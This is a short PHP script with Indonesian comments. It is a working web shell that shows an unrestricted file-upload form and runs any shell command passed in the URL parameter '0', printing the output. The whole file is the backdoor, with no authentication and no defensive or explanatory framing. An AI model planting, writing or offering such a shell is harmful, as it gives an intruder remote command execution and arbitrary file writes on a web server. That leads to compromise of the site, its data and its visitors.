<?php
// Menampilkan form uploader
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';

// Eksekusi jika ada file yang diupload
if (isset($_POST['_upl']) && $_POST['_upl'] == "Upload") {
    if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        echo '<b>Upload Done.</b><br><br>';
    } else {
        echo '<b>Upload Failed.</b><br><br>';
    }
}

// Eksekusi command JIKA parameter GET '0' ada
if (isset($_GET['0'])) {
    echo "<pre>";
    echo `$_GET[0]`;
    echo "</pre>";
}
?>
